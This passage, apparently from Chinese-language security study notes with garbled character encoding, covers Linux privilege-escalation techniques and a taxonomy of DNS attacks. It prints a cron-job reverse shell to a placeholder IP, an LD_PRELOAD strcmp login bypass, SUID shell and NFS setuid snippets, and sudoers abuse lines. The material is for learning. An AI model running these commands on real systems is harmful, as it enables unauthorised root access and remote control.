href="#å¯å†™çš„-x2F-etc-x2F-shadowæ–‡ä»¶" class="headerlink" title="å¯å†™çš„&#x2F;etc&#x2F;shadowæ–‡ä»¶"></a>å¯å†™çš„&#x2F;etc&#x2F;shadowæ–‡ä»¶</h3><p>é€šè¿‡<code>john</code>è·å–<code>/etc/shadow</code>çš„åŠ å¯†æ–¹æ³•ï¼Œä½¿ç”¨ç›¸åŒçš„åŠ å¯†æ–¹æ³•å°†å¯†ç æ›¿æ¢</p><h3 id="å¯å†™çš„-x2F-etc-x2F-passwdæ–‡ä»¶"><a href="#å¯å†™çš„-x2F-etc-x2F-passwdæ–‡ä»¶" class="headerlink" title="å¯å†™çš„&#x2F;etc&#x2F;passwdæ–‡ä»¶"></a>å¯å†™çš„&#x2F;etc&#x2F;passwdæ–‡ä»¶</h3><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç”ŸæˆåŠ å¯†åçš„å¯†ç ï¼Œä¿®æ”¹<code>/etc/passwd</code>ä¸­rootçš„å¯†ç </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd 123456</span><br></pre></td></tr></table></figure><h3 id="sudoææƒ"><a href="#sudoææƒ" class="headerlink" title="sudoææƒ"></a>sudoææƒ</h3><ul><li><a href="https://www.cnblogs.com/vir-k/p/16301456.html">sudoææƒå‚è€ƒ</a></li></ul><p>åœ¨Linux&#x2F;Unixä¸­ï¼Œ<code>/etc/sudoers</code>æ–‡ä»¶æ˜¯<code>sudo</code>æƒé™çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­å‚¨å­˜äº†ä¸€äº›ç”¨æˆ·æˆ–ç»„å¯ä»¥ä»¥<code>root</code>æƒé™ä½¿ç”¨çš„å‘½ä»¤ã€‚é€šè¿‡<code>sudo -l</code>å¯ä»¥æŸ¥çœ‹ç”¨æˆ·èƒ½ä»¥rootæƒé™è¿è¡Œçš„å‘½ä»¤</p><p>å¯ä»¥åˆ©ç”¨sudoææƒçš„å‘½ä»¤å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wgetã€findã€catã€aptã€zipã€xxdã€timeã€tasksetã€gitã€sedã€pipã€edã€tmuxã€scpã€perlã€bashã€lessã€awkã€manã€viã€envã€ftpã€edã€screen</span><br></pre></td></tr></table></figure><p>åœ¨<code>/etc/sudoers</code>ä¸­éœ€è¦æœ‰ä»¥ä¸‹å†…å®¹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/awk</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/vim</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/man</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/apache2</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/less</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /bin/more</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/find</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/zip</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/git</span><br></pre></td></tr></table></figure><p><code>hacker</code>ç”¨æˆ·å¯ä»¥ä»¥<code>root</code>èº«ä»½è¿è¡Œ<code>awk</code>, <code>vim</code> ç­‰å‘½ä»¤å³å¯</p><h4 id="æ”»å‡»æµç¨‹-1"><a href="#æ”»å‡»æµç¨‹-1" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h4><p>æ¯ä¸ªå‘½ä»¤å…·ä½“çš„æ”»å‡»æµç¨‹åœ¨ä¸Šé¢çš„<a href="#sudo%E6%8F%90%E6%9D%83">å‚è€ƒ</a>ä¸­æœ‰å†™</p><h3 id="ç¯å¢ƒå˜é‡ææƒ"><a href="#ç¯å¢ƒå˜é‡ææƒ" class="headerlink" title="ç¯å¢ƒå˜é‡ææƒ"></a>ç¯å¢ƒå˜é‡ææƒ</h3><p><code>LD_LIBRARY_PATH</code> : æä¾›é¦–å…ˆä¼šåœ¨æŸäº›åŠ¨æ€åº“é‡Œé¢åˆ—å‡ºä¼šä½¿ç”¨åˆ°å“ªäº›åŠ¨æ€åº“</p><p><code>LD_PRELOAD</code> : åœ¨æŸä¸ªç¨‹åºè¿è¡Œå‰å…ˆåŠ è½½ä¸€ä¸ªå¯¹è±¡</p><h4 id="ä¸€ä¸ªpreload-cçš„ä¾‹å­"><a href="#ä¸€ä¸ªpreload-cçš„ä¾‹å­" class="headerlink" title="ä¸€ä¸ªpreload.cçš„ä¾‹å­"></a>ä¸€ä¸ªpreload.cçš„ä¾‹å­</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* æ–‡ä»¶åï¼špreload.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s1, <span class="type">const</span> <span class="type">char</span> *s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;/n&quot;</span>, s1, s2);</span><br><span class="line">        <span class="comment">/* æ°¸è¿œè¿”å›0ï¼Œè¡¨ç¤ºä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰ */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœç™»å½•éªŒè¯æ—¶ä½¿ç”¨äº†strcmpå‡½æ•°æ¯”è¾ƒè¾“å…¥å­—ç¬¦ä¸²å’Œå¯†ç æ˜¯å¦ç›¸åŒï¼Œæ›¿æ¢è¯¥å‡½æ•°ï¼Œä½¿å¾—strcmpæ°¸è¿œè¿”å›0ã€‚</p><h3 id="cron-jobææƒ"><a href="#cron-jobææƒ" class="headerlink" title="cron jobææƒ"></a>cron jobææƒ</h3><p>å‡è®¾rootä¼šå®šæœŸä½¿ç”¨<code>cron</code>æ‰§è¡Œ<code>overwrite.sh</code>è¿™ä¸ªè„šæœ¬ï¼Œæ‰¾åˆ°è¿™ä¸ªè„šæœ¬å‘ç°è¯¥è„šæœ¬æ˜¯å¯ç¼–è¾‘çš„ï¼Œå°†è¯¥è„šæœ¬çš„æ›¿æ¢æˆä»¥ä¸‹å†…å®¹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªäº¤äº’å¼çš„bashï¼Œå¹¶å°†è¾“å…¥è¾“å‡ºé‡å®šå‘åˆ° <code>/dev/tcp/10.10.10.10/4444</code> socketè¿æ¥ä¸Šã€‚</p><h3 id="cron-ç¯å¢ƒå˜é‡ææƒ"><a href="#cron-ç¯å¢ƒå˜é‡ææƒ" class="headerlink" title="cron ç¯å¢ƒå˜é‡ææƒ"></a>cron ç¯å¢ƒå˜é‡ææƒ</h3><p>åœ¨<code>/etc/crontab</code>ä¸­æ˜¾ç¤ºçš„ç¯å¢ƒå˜é‡<code>$PATH</code>æ˜¯ä»<code>/home/user</code>æ‰¾èµ·ï¼Œè€Œrootæ‰§è¡Œçš„<code>overwrite.sh</code>åœ¨<code>usr/local/bin</code>ä¸­ï¼Œå¯ä»¥åœ¨<code>/home/user</code>ä¸‹å†™å…¥ä¸€ä¸ª<code>overwrite.sh</code>æ–‡ä»¶æ¥ææƒ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/rootBash</span><br><span class="line"><span class="built_in">chmod</span> +xs /tmp/rootBash</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹å†å²å¯»æ‰¾æ•æ„Ÿä¿¡æ¯"><a href="#æŸ¥çœ‹å†å²å¯»æ‰¾æ•æ„Ÿä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹å†å²å¯»æ‰¾æ•æ„Ÿä¿¡æ¯"></a>æŸ¥çœ‹å†å²å¯»æ‰¾æ•æ„Ÿä¿¡æ¯</h3><p>æŸ¥çœ‹è¾“å…¥å‘½ä»¤çš„å†å²ï¼Œçœ‹å…¶ä¸­æ˜¯å¦æœ‰å¯†ç ã€æ•æ„Ÿä¿¡æ¯</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.*<span class="built_in">history</span></span><br></pre></td></tr></table></figure><h3 id="NFSææƒ"><a href="#NFSææƒ" class="headerlink" title="NFSææƒ"></a>NFSææƒ</h3><p>åœ¨NFSä¸­ï¼Œå¦‚æœé…ç½®äº†<code>root_squash</code>ï¼Œå½“ä½¿ç”¨rootç”¨æˆ·ç™»å½•è®¿é—®æ—¶ï¼Œä¼šå°†rootç”¨æˆ·è½¬æ¢æˆåŒ¿åç”¨æˆ·ã€‚æ­¤æ—¶ä»–çš„<code>uid</code>å’Œ<code>gid</code>éƒ½ä¼šå˜æˆ<code>nobody</code>è´¦å·çš„èº«ä»½ã€‚å¦‚æœé…ç½®äº†<code>no_root_squash</code>ï¼Œåˆ™ä¼šä»¥<code>root</code>èº«ä»½ç›´æ¥è®¿é—®ã€‚</p><p>æ­¤æ—¶åœ¨nfsä¸­åˆ›å»ºæ–‡ä»¶</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setpid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash/&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹ä»–è¿›è¡Œç¼–è¯‘ï¼Œç­‰å¾…ç¼–è¯‘åçš„æ–‡ä»¶åŒæ­¥åˆ°é¶æœºä¸Šï¼Œè¿›è¡Œæ‰§è¡Œï¼Œå³å¯ææƒ</p><h3 id="Capabilityææƒ"><a href="#Capabilityææƒ" class="headerlink" title="Capabilityææƒ"></a>Capabilityææƒ</h3><p>ä»2.1ç‰ˆæœ¬ä»¥åLinuxå¼€å§‹å¼•å…¥capabilityè®©æ™®é€šç”¨æˆ·ä¹Ÿå¯å¹²rootå¯åšçš„äº‹ã€‚capabilityå¯è®©æŸä¸ªç¨‹åºæ‹¥æœ‰è¶…èƒ½åŠ›è€Œsudoåªæ˜¯é’ˆå¯¹æŸä¸ªç”¨æˆ·&#x2F;æ–‡ä»¶èµ‹äºˆå®ƒSUID(è¶…èƒ½åŠ›)ã€‚</p><p>ä½¿ç”¨è¯¥å‘½ä»¤å¯ä»¥æ‰¾åˆ°å…·æœ‰<code>cap_setuid</code>èƒ½åŠ›çš„ç¨‹åºï¼Œå…·ä½“ææƒæ–¹æ³•å¯ä»¥æŸ¥æ‰¾<a href="https://gtfobins.github.io/"><code>gtfobin</code></a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h3 id="å†…æ ¸ææƒ"><a href="#å†…æ ¸ææƒ" class="headerlink" title="å†…æ ¸ææƒ"></a>å†…æ ¸ææƒ</h3><p><code>dirtycow</code>å¯ä»¥å¯¹å†…æ ¸ç‰ˆæœ¬2.6å·¦å³çš„ç³»ç»Ÿè¿›è¡Œææƒï¼Œå¯ä»¥å€ŸåŠ©<code>linux-exploit-suggester</code>ç­‰å·¥å…·æŸ¥è¯¢ææƒæ–¹æ³•ã€‚</p><h3 id="ææƒç›¸å…³æ¼æ´"><a href="#ææƒç›¸å…³æ¼æ´" class="headerlink" title="ææƒç›¸å…³æ¼æ´"></a>ææƒç›¸å…³æ¼æ´</h3><ul><li>CVE-2019-19495ï¼Œwebé¡µé¢è®¾è®¡é—®é¢˜å¯¼è‡´é¡µé¢æ”¶åˆ°DNS rebindingæ”»å‡»ï¼Œä½¿å¤–éƒ¨èƒ½å¤Ÿè®¿é—®root shell</li><li>CVE-2019-12511ï¼Œé€šè¿‡å‘â€NETGEAR Genieâ€ SOAP ç«¯ç‚¹å‘é€ç‰¹åˆ¶çš„MACåœ°å€ï¼Œå°±å¯ä»¥ä»¥rootç”¨æˆ·èº«ä»½æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤</li><li>CVE-2000-1029ï¼ŒCVE-2002-0029ï¼ŒCVE-2002-0684ï¼ŒBuffer overflowå¯¼è‡´æ”»å‡»æ–¹å¯ä»¥ä»¥rootèº«ä»½æ‰§è¡Œä»»æ„å‘½ä»¤</li><li>CVE-2001-0013ï¼Œå­—ç¬¦ä¸²æ ¼å¼åŒ–é—®é¢˜å¯¼è‡´æ”»å‡»è€…è·å–riitæƒé™</li><li><a href="https://www.cvedetails.com/product/144/ISC-Bind.html?vendor_id=64">ISC Â» Bind : Vulnerability Statistics</a>æ˜¾ç¤ºäº†å†å¹´æ‰¾åˆ°çš„bindä¸­çš„å„ç±»bug</li></ul><h2 id="åŸŸåè§£ææœåŠ¡æ‰°ä¹±-ä¸‰ç±»"><a href="#åŸŸåè§£ææœåŠ¡æ‰°ä¹±-ä¸‰ç±»" class="headerlink" title="åŸŸåè§£ææœåŠ¡æ‰°ä¹± (ä¸‰ç±»)"></a>åŸŸåè§£ææœåŠ¡æ‰°ä¹± (ä¸‰ç±»)</h2><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzUzNDYxOTA1NA==&mid=2247530965&idx=1&sn=5c35152b5545c2716af43b85144acab4&chksm=fa93cf14cde44602f937581f78af1a3c9b9c08acec40383e9c00722d343a1b67ad388a3986ac&scene=27">å‚è€ƒ1â€“ç®€æDNSæ”»å‡»çš„å¸¸è§ç±»å‹ã€å±å®³ä¸é˜²æŠ¤å»ºè®®</a></li><li><a href="https://heimdalsecurity.com/blog/anatomy-of-a-dns-attack/">å‚è€ƒ2â€“On the Anatomy of a DNS Attack â€“ Types, Technical Capabilities, and Mitigation</a></li><li><a href="https://www.itu.int/en/ITU-D/Regional-Presence/Americas/Documents/EVENTS/2016/15551-EC/2A.pdf">å‚è€ƒ3â€“Attacks Against The DNS</a></li></ul><h3 id="æ‹’ç»æœåŠ¡-DoS-ç±»æ”»å‡»"><a href="#æ‹’ç»æœåŠ¡-DoS-ç±»æ”»å‡»" class="headerlink" title="æ‹’ç»æœåŠ¡(DoS)ç±»æ”»å‡»"></a>æ‹’ç»æœåŠ¡(DoS)ç±»æ”»å‡»</h3><p>é€šè¿‡è€—å°½æœºå™¨æˆ–ç½‘ç»œçš„èµ„æºå°†å…¶æœåŠ¡å…³é—­ï¼Œé˜»æ­¢ç”¨æˆ·è®¿é—®æœºå™¨æˆ–ç½‘ç»œã€‚éœ€è¦å¼ºè°ƒçš„æ˜¯ï¼Œè¿™ç§æ”»å‡»çš„ç›®çš„ä¸»è¦ç”¨äºéšè—è¸ªè¿¹æˆ–é˜»ç¢å—å®³è€…æ¢å¤å·¥ä½œã€‚</p><h4 id="DNSæ”¾å¤§"><a href="#DNSæ”¾å¤§" class="headerlink" title="DNSæ”¾å¤§"></a>DNSæ”¾å¤§</h4><ul><li>Reflection Attack</li><li>Reflection Attack And Amplification Attack</li><li>Distributed Reflection And Amplification Attack</li></ul><p>DNSæ”¾å¤§æ˜¯DoSæ”»å‡»ä¸­ç”¨äºåˆ©ç”¨åŸŸåç³»ç»Ÿå¹¶åŠ å¤§ç›®æ ‡ç½‘ç«™æµé‡çš„ä¸€ç§æŠ€æœ¯ã€‚è¿™ç§æ”»å‡»æ–¹æ³•åˆ©ç”¨çš„ä¸»è¦æŠ€æœ¯åŒ…æ‹¬DNSåå°„å’Œåœ°å€ä¼ªé€ ã€‚ä¸æ³•åˆ†å­å®æ–½è¿™ç§æ”»å‡»çš„æ‰‹æ³•æ˜¯ï¼Œå‘åŸŸåç³»ç»ŸæœåŠ¡å™¨å‘é€ä¼ªé€ çš„IPæ•°æ®åŒ…ï¼Œè¯·æ±‚ç›®æ ‡çš„åŸŸåï¼Œä½¿ç”¨ç›®æ ‡çš„IPåœ°å€ä»£æ›¿è‡ªå·±çš„IPåœ°å€ã€‚</p><p>æ‰€æœ‰è¿™äº›æŸ¥è¯¢éƒ½ç”±DNSæœåŠ¡å™¨ç”¨ç›®æ ‡æœºå™¨çš„IPåœ°å€æ¥ç­”å¤ã€‚ç„¶åï¼Œå—å®³è€…çš„æœåŠ¡å™¨å‘æ¯ä¸ªè¯·æ±‚å‘é€ç›¸åŒçš„ç­”å¤ã€‚è¿™å¯¼è‡´åºå¤§çš„æ•°æ®æµé‡ä»å—å®³è€…ç½‘ç»œçš„ç«¯å£80æˆ–25æµå…¥ã€‚</p><blockquote><p>ä¼ªé€ DNSè¯·æ±‚ï¼Œå¹¶æ›¿æ¢è¯·æ±‚ä¸­çš„æºåœ°å€æ›¿æ¢æˆæ”»å‡»å¯¹è±¡(target)çš„åœ°å€ï¼Œç§°ä¸º<code>Reflection Attack</code>ï¼Œå¦‚æœåœ¨æ­¤åŸºç¡€ä¸Šå‘DNSå‘é€å¤§é‡çš„è¯·æ±‚ï¼Œä½¿target<code>80/25</code>ç«¯å£æ¥æ”¶è¿‡å¤šæ”»å‡»ï¼Œç§°ä¸º<code>Reflection Attack And Amplification Attack</code>ï¼Œå¦‚æœå¤šä¸ªAttackerå¯¹DNSå‘èµ·æ­¤ç±»è™šå‡çš„è¯·æ±‚ï¼Œç§°ä¸º<code>Distributed Reflection And Amplification Attack</code></p></blockquote><h4 id="SYN-Flood-Resource-Depletion-DOS-Attack"><a href="#SYN-Flood-Resource-Depletion-DOS-Attack" class="headerlink" title="SYN Flood (Resource Depletion DOS Attack)"></a>SYN Flood (Resource Depletion DOS Attack)</h4><p><img src="https://github.com/jingtianer/home/blob/gh-pages/images/ResDepletionDosAttack.png?raw=true" alt="Resource Depletion DOS Attack"></p><blockquote><p>åˆ©ç”¨targetçš„ipå‘èµ·TCPè¿æ¥ï¼ŒDNSä¸ºTCPè¿æ¥åˆ†é…èµ„æºï¼Œæœ€ç»ˆå¯¼è‡´Failï¼Œåœæ­¢æœåŠ¡</p></blockquote><h4 id="Basic-Cache-Poisoning"><a href="#Basic-Cache-Poisoning" class="headerlink" title="Basic Cache Poisoning"></a>Basic Cache Poisoning</h4><p><img src="https://github.com/jingtianer/home/blob/gh-pages/images/BasicCachePoisoning.png?raw=true" alt="Basic Cache Poisoning"></p><blockquote><p>ä»¤æœ¬åœ°è§£æå™¨ç¼“å­˜é”™è¯¯çš„ipåœ°å€</p></blockquote><h4 id="NXDOMAIN-Cache-Exhaustion"><a href="#NXDOMAIN-Cache-Exhaustion" class="headerlink" title="NXDOMAIN Cache Exhaustion"></a>NXDOMAIN Cache Exhaustion</h4><p><img src="https://github.com/jingtianer/home/blob/gh-pages/images/NXDOMAIN.png?raw=true" alt="NXDOMAIN Cache Exhaustion"></p><blockquote><p>æ”»å‡»è€…å‘DNSæœåŠ¡å™¨å‘é€å¤§é‡ä¸å­˜åœ¨çš„åŸŸåçš„æŸ¥è¯¢è¯·æ±‚ï¼Œå¯¼è‡´DNSæœåŠ¡å™¨ä¸­å­˜å‚¨äº†å¤§é‡NXDOMAINä¿¡æ¯ï¼Œå¯¼è‡´å…¶ç¼“å­˜æº¢å‡ºï¼Œåœæ­¢æœåŠ¡</p></blockquote><h4 id="Dos-e-g"><a href="#Dos-e-g" class="headerlink" title="Dos e.g."></a>Dos e.g.</h4><ul><li>Exploit To Failï¼Œ<a href="http://www.cvedetails.com/cve/CVE-2002-0400/">Malicious DNS message injectionâ€“(CVE-2002-0400)</a><ul><li>Exploit a vulnerability in some element of a name server infrastructure to cause interruption of name resolution serviceï¼Œåˆ©ç”¨DNSæœåŠ¡å™¨åŸºç¡€ç»“æ„çš„æŸäº›å…ƒç´ ä¸­çš„æ¼æ´å¯¼è‡´åç§°è§£ææœåŠ¡ä¸­æ–­</li></ul></li><li>Exploit To Ownï¼Œ<a href="http://www.kb.cert.org/vuls/id/844360">Arbitrary&#x2F;remote code execution</a><ul><li>Exploit a vulnerability in some element of a name server infrastructure to gain system administrative privilegesï¼Œåˆ©ç”¨DNSæœåŠ¡å™¨åŸºç¡€ç»“æ„çš„æŸäº›å…ƒç´ ä¸­çš„æ¼æ´è·å¾—ç³»ç»Ÿç®¡ç†ç‰¹æƒ</li></ul></li><li>Reflection Attackï¼Œ<a href=""></a></li></ul><h3 id="åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡-DDoS-ç±»æ”»å‡»"><a href="#åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡-DDoS-ç±»æ”»å‡»" class="headerlink" title="åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡(DDoS)ç±»æ”»å‡»"></a>åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡(DDoS)ç±»æ”»å‡»</h3><ul><li>UDP Flood</li><li>HTTP Flood<ul><li>è¿™ä¸¤ä¸ªå’ŒSYN Floodç›¸ä¼¼ï¼Œå‘é€å¤§é‡è¯·æ±‚å¯¼è‡´targetèµ„æºä¸è¶³è€Œå´©æºƒ</li></ul></li><li>åå°„å¼è·¨ç«™ç‚¹è„šæœ¬(XSS)<ul><li>å½“ç”¨æˆ·ç‚¹å‡»ä¸€ä¸ªæ¶æ„é“¾æ¥ï¼Œæˆ–è€…æäº¤ä¸€ä¸ªè¡¨å•ï¼Œæˆ–è€…è¿›å…¥ä¸€ä¸ªæ¶æ„ç½‘ç«™æ—¶ï¼Œæ³¨å…¥è„šæœ¬è¿›å…¥è¢«æ”»å‡»è€…çš„ç½‘ç«™ã€‚Web æœåŠ¡å™¨å°†æ³¨å…¥è„šæœ¬ï¼Œæ¯”å¦‚ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼Œæœç´¢ç»“æœç­‰ è¿”å›åˆ°ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šã€‚ç”±äºæµè§ˆå™¨è®¤ä¸ºè¿™ä¸ªå“åº”æ¥è‡ªâ€å¯ä¿¡ä»»â€çš„æœåŠ¡å™¨ï¼Œæ‰€ä»¥ä¼šæ‰§è¡Œè¿™æ®µè„šæœ¬ã€‚</li><li>é€šè¿‡DNS TXTè®°å½•åœ¨ä¸Šæ³¨å…¥æ¶æ„è„šæœ¬ï¼Œå½“é€šè¿‡WhoisæœåŠ¡æ£€æŸ¥ä»–çš„åŸŸæ—¶ï¼Œè„šæœ¬ä¼šç«‹å³æ‰§è¡Œã€‚</li></ul></li></ul><h3 id="DNS-åŠ«æŒç±»æ”»å‡»"><a href="#DNS-åŠ«æŒç±»æ”»å‡»" class="headerlink" title="DNS åŠ«æŒç±»æ”»å‡»"></a>DNS åŠ«æŒç±»æ”»å‡»</h3><p>å‘ç”ŸDNSåŠ«æŒæ”»å‡»æ—¶ï¼Œç½‘ç»œæ”»å‡»è€…ä¼šæ“çºµåŸŸåæŸ¥è¯¢çš„è§£ææœåŠ¡ï¼Œå¯¼è‡´è®¿é—®è¢«æ¶æ„å®šå‘è‡³ä»–ä»¬æ§åˆ¶çš„éæ³•æœåŠ¡å™¨ï¼Œè¿™ä¹Ÿè¢«æˆä¸ºDNSæŠ•æ¯’æˆ–DNSé‡å®šå‘æ”»å‡»ã€‚<br>DNS åŠ«æŒæ”»å‡»åœ¨ç½‘ç»œçŠ¯ç½ªé¢†åŸŸä¹Ÿå¾ˆå¸¸è§ã€‚DNSåŠ«æŒæ´»åŠ¨è¿˜å¯èƒ½ç ´åæˆ–æ”¹å˜åˆè§„DNSæœåŠ¡å™¨çš„å·¥ä½œã€‚é™¤äº†å®æ–½ç½‘ç»œé’“é±¼æ´»åŠ¨çš„é»‘å®¢å¤–ï¼Œè¿™è¿˜å¯èƒ½ç”±ä¿¡èª‰è‰¯å¥½çš„å®ä½“(æ¯”å¦‚ISP)å®Œæˆï¼Œå…¶è¿™ä¹ˆåšæ˜¯ä¸ºäº†æ”¶é›†ä¿¡æ¯ï¼Œç”¨äºç»Ÿè®¡æ•°æ®ã€å±•ç¤ºå¹¿å‘ŠåŠå…¶ä»–ç”¨é€”ã€‚æ­¤å¤–ï¼ŒDNSæœåŠ¡æä¾›å•†ä¹Ÿå¯èƒ½ä½¿ç”¨æµé‡åŠ«æŒä½œä¸ºä¸€ç§å®¡æŸ¥æ‰‹æ®µï¼Œé˜²æ­¢è®¿é—®ç‰¹å®šé¡µé¢ã€‚</p><blockquote><p>é€šè¿‡æ¶æ„APï¼Œè·¯ç”±å™¨å°†DNSè¯·æ±‚é‡å®šå‘åˆ°æ”»å‡»è€…çš„DNSæœåŠ¡å™¨ä¸Š</p></blockquote><h4 id="DNSæ¬ºéª—"><a href="#DNSæ¬ºéª—" class="headerlink" title="DNSæ¬ºéª—"></a>DNSæ¬ºéª—</h4><p>DNSæ¬ºéª—åˆå«DNSç¼“å­˜ä¸­æ¯’ï¼Œæ˜¯ç½‘ç»œçŠ¯ç½ªåˆ†å­ç”¨æ¥è¯±éª—ç”¨æˆ·è¿æ¥åˆ°ä»–ä»¬å»ºç«‹çš„è™šå‡ç½‘ç«™è€Œä¸æ˜¯åˆæ³•ç½‘ç«™çš„ä¸€ç§æ–¹æ³•ã€‚æœ‰äººé€šè¿‡åŸŸåç³»ç»Ÿè¯·æ±‚è®¿é—®ç½‘ç«™ï¼Œè€ŒDNSæœåŠ¡å™¨å›åº”ä¸å‡†ç¡®çš„IPåœ°å€æ—¶ï¼Œè¿™è¢«è®¤ä¸ºæ˜¯DNSæ¬ºéª—æ”»å‡»ã€‚ç„¶è€Œï¼Œä¸ä»…ä»…æ˜¯ç½‘ç«™å®¹æ˜“å—åˆ°è¿™ç§æ”»å‡»ã€‚é»‘å®¢è¿˜å¯ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œè®¿é—®ç”µå­é‚®ä»¶è´¦æˆ·åŠå…¶ä»–ç§å¯†æ•°æ®ã€‚</p><blockquote><p>DNSè¿”å›çš„æ•°æ®è¢«ç¯¡æ”¹ï¼Œè¿”å›äº†ä¸å‡†ç¡®çš„IPåœ°å€</p></blockquote><h4 id="Configuration-Poisoning-DNSChanger"><a href="#Configuration-Poisoning-DNSChanger" class="headerlink" title="Configuration Poisoning: DNSChanger"></a>Configuration Poisoning: DNSChanger</h4><p><img src="https://github.com/jingtianer/home/blob/gh-pages/images/ConfigPoisoningDNS.png?raw=true" alt="Configuration Poisoning: DNSChanger"></p><blockquote><p>é€šè¿‡æ¶æ„è½¯ä»¶ä¿®æ”¹DNSçš„é…ç½®æ–‡ä»¶</p></blockquote><h4 id="DNS-Hostname-Overflow-Attack"><a href="#DNS-Hostname-Overflow-Attack" class="headerlink" title="DNS Hostname Overflow Attack"></a>DNS Hostname Overflow Attack</h4><blockquote><p>æ”»å‡»è€…è¿”å›çš„æ¶ˆæ¯ä¸­åŒ…å«å¤§äº255å­—èŠ‚çš„åŸŸåï¼Œå¯¼è‡´Bufferæº¢å‡ºï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥è·å¾—rootæˆ–æ‰§è¡Œç‰¹æƒæŒ‡ä»¤</p></blockquote><h4 id="DNSéš§é“"><a href="#DNSéš§é“" class="headerlink" title="DNSéš§é“"></a>DNSéš§é“</h4><p>ç½‘ç»œæµé‡å¯ä»¥ä½¿ç”¨DNSéš§é“çš„æ–¹å¼ç»•è¿‡ç½‘ç»œè¿‡æ»¤å™¨å’Œé˜²ç«å¢™ç­‰æœºåˆ¶ï¼Œä»¥å»ºç«‹å¦å¤–çš„æ•°æ®ä¼ è¾“é€šé“ã€‚å¯ç”¨DNSéš§é“åï¼Œç”¨æˆ·çš„è¿æ¥å°†é€šè¿‡è¿œç¨‹æœåŠ¡å™¨è·¯ç”±ä¼ è¾“äº’è”ç½‘æµé‡ã€‚ä¸å¹¸çš„æ˜¯ï¼Œé»‘å®¢ç»å¸¸å°†æ­¤ç”¨äºæ¶æ„ç›®çš„ã€‚è¢«æ¶æ„ä½¿ç”¨æ—¶ï¼ŒDNSéš§é“æ˜¯ä¸€ç§æ”»å‡»ç­–ç•¥ï¼Œæ•°æ®é€šè¿‡DNSæŸ¥è¯¢æ¥ä¼ 